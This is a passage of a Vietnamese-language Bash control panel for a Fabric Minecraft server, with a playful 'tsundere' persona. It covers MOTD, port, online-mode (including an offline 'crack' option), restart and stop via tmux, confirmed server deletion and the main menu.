    if [[ -z "$NEW_MOTD" ]]; then
        warn "Để trống là sao?! Hủy không sửa nữa!"
        pause
        return
    fi

    sed -i '/^motd=/d' "$MC_DIR/server.properties"

    echo "motd=${NEW_MOTD}" >> "$MC_DIR/server.properties"

    success "MOTD đã cập nhật xong rồi!"

    tsu "Hmph... Được rồi đó, server nhìn dễ thương hơn rồi đấy. ♡"

    echo
    warn "Nhớ Restart server thì MOTD mới chịu hiện ra nhé đồ ngốc!"

    pause
}

# ==========================================================
# CHANGE PORT
# ==========================================================

change_port_menu() {

    clear

    echo -e "${LIGHTPINK}${BOLD}"
    echo "╔══════════════════ ♡ THAY ĐỔI CỔNG (PORT) ♡ ═════════════════╗"
    echo -e "${RESET}"

    cd "$MC_DIR"

    CURRENT_PORT=$(grep '^server-port=' server.properties 2>/dev/null | cut -d'=' -f2 || echo "$SERVER_PORT")

    echo
    echo -e "  Cổng hiện tại: ${GREEN}${CURRENT_PORT}${RESET}"
    echo

    read -rp "Nhập Cổng (Port) mới [1024-65535]: " NEW_PORT

    if [[ ! "$NEW_PORT" =~ ^[0-9]+$ ]] || [ "$NEW_PORT" -lt 1024 ] || [ "$NEW_PORT" -gt 65535 ]; then
        error_msg "Port gì lạ vậy?! Nhập số từ 1024 tới 65535 giùm tôi cái, baka!"
        pause
        return
    fi

    if [[ -f server.properties ]]; then
        sed -i "s/^server-port=.*/server-port=${NEW_PORT}/" server.properties
        SERVER_PORT="$NEW_PORT"
        success "Đã đổi cổng thành ${NEW_PORT} rồi nha!"
        tsu "Thay cổng xong rồi đó... Nhớ Restart server lại thì cổng mới mới có hiệu lực đấy! >///<"
    else
        error_msg "Không thấy file server.properties đâu hết!"
    fi

    pause
}

# ==========================================================
# CHECK UPDATE
# ==========================================================

check_update_menu() {

    clear

    echo -e "${LIGHTPINK}${BOLD}"
    echo "╔══════════════════ ♡ KIỂM TRA CẬP NHẬT ♡ ══════════════════╗"
    echo -e "${RESET}"

    echo
    info "Đang kiểm tra thông tin Modpack trên GitHub cho bạn đây..."
    echo

    if git ls-remote "$MODPACK_REPO" HEAD >/dev/null 2>&1; then
        LATEST_COMMIT=$(git ls-remote "$MODPACK_REPO" HEAD | awk '{print $1}' | cut -c1-7)
        success "Kết nối tới GitHub Modpack ngon lành rồi nhé!"
        echo -e "  Mã Commit mới nhất trên GitHub: ${CYAN}${LATEST_COMMIT}${RESET}"
        echo
        tsu "Nếu muốn cập nhật Modpack mới nhất thì chọn mục [5] -> Cài lại Bedrock/Geyser hoặc chạy lại cài đặt nhé! Hmph."
    else
        warn "Ứ hự, không kết nối tới GitHub Repository được rồi! Kiểm tra lại mạng đi!"
    fi

    pause
}

# ==========================================================
# SERVER OPTIONS
# ==========================================================

server_options() {

    while true; do

        clear

        echo -e "${LIGHTPINK}${BOLD}"
        echo "╔══════════════════ ♡ TÙY CHỌN SERVER ♡ ═════════════════╗"
        echo -e "${RESET}"

        echo
        echo "  1. Tắt server (Cho server ngủ)"
        echo "  2. Khởi động lại/Bắt đầu server (Restart/Boot)"
        echo "  3. Cài lại Bedrock / Geyser + Floodgate"
        echo "  4. Quay lại panel"
        echo

        read -rp "Chọn đi: " CHOICE

        case "$CHOICE" in

            1)
                echo
                tsu "Tính tắt server thiệt hả? Chắc chưa đấy?"
                read -rp "[y/N]: " CONFIRM

                if [[ "$CONFIRM" =~ ^[Yy]$ ]]; then

                    if check_tmux_alive; then
                        mc_command "save-all"
                        sleep 2
                        mc_command "stop"

                        for _ in {1..15}; do
                            if ! check_tmux_alive; then
                                break
                            fi
                            sleep 1
                        done

                        if check_tmux_alive; then
                            tmux kill-session -t "$TMUX_NAME" 2>/dev/null || true
                        fi

                        success "Server đã tắt ngoan ngoãn rồi!"
                    else
                        warn "Server có chạy đâu mà tắt?!"
                    fi

                    tsu "Được rồi... server đi ngủ rồi đó. Hmph! >///<"
                    sleep 2

                else
                    tsu "Hmph! Không tắt thì thôi, làm giật cả mình! >:3"
                    sleep 1
                fi
                ;;

            2)
                echo
                tsu "Muốn khởi động lại server sao?"
                read -rp "[y/N]: " CONFIRM

                if [[ "$CONFIRM" =~ ^[Yy]$ ]]; then

                    if check_tmux_alive; then
                        mc_command "save-all"
                        sleep 2
                        mc_command "stop"

                        for _ in {1..15}; do
                            if ! check_tmux_alive; then
                                break
                            fi
                            sleep 1
                        done

                        if check_tmux_alive; then
                            tmux kill-session -t "$TMUX_NAME" 2>/dev/null || true
                        fi
                    fi

                    echo
                    info "Đang mở tiến trình tmux mới nè..."

                    tmux new-session -d -s "$TMUX_NAME" "cd $MC_DIR && exec java -Xms2G -Xmx3G -jar fabric-server-launch.jar nogui" 2>/dev/null || true

                    success "Đã tạo tmux thành công rồi nha!"

                    sleep 3

                    apply_ops

                    success "Server đã được Restart thành công!"
                    tsu "Xong rồi đó! Tôi đã tự thoát console và đưa bạn về lại Panel nè. Cảm ơn tôi đi chứ! Hmph! >///<"
                    sleep 2

                else
                    tsu "Không restart thì thôi... baka! >:3"
                    sleep 1
                fi
                ;;

            3)
                install_geyser
                sleep 2
                ;;

            4)
                return
                ;;

            *)
                warn "Lựa chọn sai bét rồi kìa!"
                sleep 1
                ;;

        esac

    done
}

# ==========================================================
# DELETE SERVER
# ==========================================================

delete_server() {

    banner

    echo -e "${RED}${BOLD}〔 XÓA TOÀN BỘ SERVER 〕${RESET}"
    line
    echo
    echo -e "  ${YELLOW}⚠${RESET} CẢNH BÁO NÈ! Hành động này sẽ xóa sạch thư mục:"
    echo -e "    ${WHITE}${MC_DIR}${RESET}"
    echo
    echo -e "  ${GRAY}Mọi thế giới, mod, config và dữ liệu sẽ bốc hơi vĩnh viễn đó!${RESET}"
    echo

    read -rp "  Gõ DELETE nếu bạn thực sự muốn xóa: " CONFIRM

    if [[ "$CONFIRM" != "DELETE" ]]; then
        error_msg "Đã hủy! Hừm, biết ngay là không dám xóa mà... baka! >///<"
        pause
        return
    fi

    if check_tmux_alive; then
        echo
        echo -e "  ${YELLOW}→${RESET} Đang cho dừng tiến trình Minecraft..."
        tmux send-keys -t minecraft "stop" C-m 2>/dev/null || true
        sleep 3

        if check_tmux_alive; then
            tmux kill-session -t minecraft 2>/dev/null || true
        fi
    fi

    echo -e "  ${YELLOW}→${RESET} Đang dọn dẹp sạch sẽ server..."

    if [[ -d "$MC_DIR" ]]; then
        rm -rf -- "$MC_DIR"
    fi

    if [[ ! -e "$MC_DIR" ]]; then
        echo
        line
        echo -e "${GREEN}${BOLD} ĐÃ XÓA SẠCH SẼ SERVER RỒI! ${RESET}"
        line
        echo
        echo -e "  ${WHITE}Server đã biến mất hoàn toàn rồi đó.${RESET}"
        echo
        echo -e "  ${CYAN}Muốn cài lại từ đầu không?${RESET}"
        echo -e "  Gõ lệnh này nè:"
        echo
        echo -e "    ${GREEN}${BOLD}./install-yumereiii.sh${RESET}"
        echo
        echo -e "  ${GRAY}Panel sẽ tự đóng ngay bây giờ luôn.${RESET}"
        echo
        echo -e "${PINK}Tạm biệt nhé~ Đừng có nhớ Rei quá đó... >///<${RESET}"
        line
        sleep 3

        exit 0
    else
        echo
        error_msg "Ứ hự, không xóa được thư mục rồi! Bạn kiểm tra lại đi!"
        echo -e "  ${GRAY}Panel sẽ giữ nguyên để bạn kiểm tra lỗi nè.${RESET}"
        pause
    fi
}

# ==========================================================
# ONLINE MODE
# ==========================================================

online_mode_menu() {
    while true; do
        banner
        cd "$MC_DIR"
        CURRENT_ONLINE=$(grep '^online-mode=' server.properties 2>/dev/null | cut -d'=' -f2 || true)
        echo -e "${WHITE}${BOLD}〔 CHẾ ĐỘ ONLINE MODE 〕${RESET}"
        line
        echo
        echo -e "  ${GRAY}Trạng thái hiện tại:${RESET} ${GREEN}${CURRENT_ONLINE:-không rõ}${RESET}"
        echo
        echo -e "  ${GREEN}[1]${RESET} Bản quyền (Chỉ nick mua game mới vô được)"
        echo -e "      ${GRAY}online-mode=true${RESET}"
        echo
        echo -e "  ${YELLOW}[2]${RESET} Crack (Cho chơi free lậu thoải mái)"
        echo -e "      ${GRAY}online-mode=false${RESET}"
        echo
        echo -e "  ${PINK}[3]${RESET} Cho tất cả (Crack + Geyser/Floodgate nếu có)"
        echo -e "      ${GRAY}online-mode=false + Geyser/Floodgate${RESET}"
        echo
        echo -e "  ${CYAN}[0]${RESET} Quay lại panel"
        echo
        tsu "Chọn lẹ đi... Tôi không chọn hộ đâu đấy nhé, baka! >///<"
        echo
        read -rp "➜ " ONLINE_CHOICE
        case "$ONLINE_CHOICE" in
            1)
                if [[ -f server.properties ]]; then
                    if grep -q '^online-mode=' server.properties; then sed -i 's/^online-mode=.*/online-mode=true/' server.properties; else echo 'online-mode=true' >> server.properties; fi
                    success "Đã bật Chế độ Bản Quyền — Mấy nick lậu hết vô nha!"
                else error_msg "Ứ hự, không thấy file server.properties ở đâu cả!"; fi
                pause ;;
            2)
                if [[ -f server.properties ]]; then
                    if grep -q '^online-mode=' server.properties; then sed -i 's/^online-mode=.*/online-mode=false/' server.properties; else echo 'online-mode=false' >> server.properties; fi
                    success "Đã bật Chế độ Crack — Mấy bạn xài TLauncher vô tư nha!"
                else error_msg "Ứ hự, không thấy file server.properties ở đâu cả!"; fi
                pause ;;
            3)
                if [[ -f server.properties ]]; then
                    if grep -q '^online-mode=' server.properties; then sed -i 's/^online-mode=.*/online-mode=false/' server.properties; else echo 'online-mode=false' >> server.properties; fi
                    success "Đã chọn Tất Cả — online-mode=false rồi nè."
                    if [[ -d "$MC_DIR/mods" ]] && find "$MC_DIR/mods" -maxdepth 1 -type f \( -iname '*geyser*.jar' -o -iname '*floodgate*.jar' \) | grep -q .; then
                        success "Đã tìm thấy Geyser/Floodgate hoạt động tốt!"
                    else echo -e "  ${YELLOW}⚠${RESET} Chưa thấy Geyser/Floodgate đâu hết á."; fi
                else error_msg "Ứ hự, không thấy file server.properties ở đâu cả!"; fi
                pause ;;
            0) return ;;
            *) error_msg "Bấm số gì kỳ vậy?! Lựa chọn không hợp lệ!"; sleep 1 ;;
        esac
    done
}

# ==========================================================
# MAIN PANEL
# ==========================================================

panel() {

    while true; do

        banner

        PUBLIC_IP=$(get_public_ip)

        if [[ -f "$MC_DIR/server.properties" ]]; then
            SERVER_PORT=$(grep '^server-port=' "$MC_DIR/server.properties" 2>/dev/null | cut -d'=' -f2 || echo "$SERVER_PORT")
        fi

        echo -e "${GRAY}Địa chỉ IP: ${PUBLIC_IP}:${SERVER_PORT}${RESET}"

        if check_tmux_alive; then
            echo -e "Trạng thái: ${GREEN}● ĐANG CHẠY (ONLINE)${RESET}"
        else
            echo -e "Trạng thái: ${RED}● ĐÃ TẮT (OFFLINE)${RESET}"
        fi

        echo
        line

        echo
        echo -e "  ${PINK}[1]${RESET} ♡ Xem trạng thái server"
        echo -e "  ${PINK}[2]${RESET} ♡ Quản lý người chơi (Kick/Ban)"
        echo -e "  ${PINK}[3]${RESET} ♡ Mở Console / tmux"
        echo -e "  ${PINK}[4]${RESET} ♡ Cập nhật MOTD"
        echo -e "  ${PINK}[5]${RESET} ♡ Tùy chọn server"
        echo -e "  ${PINK}[6]${RESET} ♡ Đổi Online Mode"
        echo -e "  ${PINK}[7]${RESET} ♡ Xoá server"
        echo -e "  ${PINK}[8]${RESET} ♡ Thay đổi cổng (Port)"
        echo -e "  ${PINK}[9]${RESET} ♡ Kiểm tra cập nhật Modpack"
        echo -e "  ${PINK}[10]${RESET} ♡ Gửi thông báo tin nhắn (Có màu)"
        echo -e "  ${PINK}[11]${RESET} ♡ Thay đổi icon server (URL)"
        echo -e "  ${PINK}[12]${RESET} ♡ Quản lý World (Backup / Restore / Reset Seed)"
        echo -e "  ${PINK}[0]${RESET} ♡ Thoát panel"

        echo
        line
        echo
        tsu "Chọn menu đi nào... Đừng có bắt Rei phải chờ lâu đó! >///<"
        echo

        read -rp "➜ " CHOICE

        case "$CHOICE" in

            1) server_status ;;
            2) player_menu ;;
            3) console_menu ;;
            4) motd_menu ;;
            5) server_options ;;
            6) online_mode_menu ;;
            7) delete_server ;;
            8) change_port_menu ;;
            9) check_update_menu ;;
            10) broadcast_message ;;
            11) change_server_icon ;;
            12) world_management_menu ;;
            0)
                clear
                tsu "Bye bye~ Đừng có nghịch dại làm server nổ tung đó nha! >///<"
                tsu "Bật mí nè: Bạn có thể bật lại Panel bất cứ lúc nào bằng lệnh: ./install-yumereiii.sh --panel"
                exit 0
                ;;
            *)
                error_msg "Làm gì có lựa chọn đó!"
                tsu "Bấm đúng số giùm tôi cái đi, baka! >:3"
                sleep 1
                ;;

        esac

    done
}

# ==========================================================
# INSTALL
# ==========================================================

install_all() {

    install_dependencies
    prepare_directory
    install_fabric
    install_modpack
    install_geyser
    configure_server
    configure_ops
    start_server

    echo
    pause

    panel
}

# ==========================================================
# ENTRY
# ==========================================================

if [[ "$1" == "--delete" ]]; then
    delete_server
    exit 0
fi

if [[ "$1" == "--panel" ]]; then
    panel
    exit 0
fi

install_all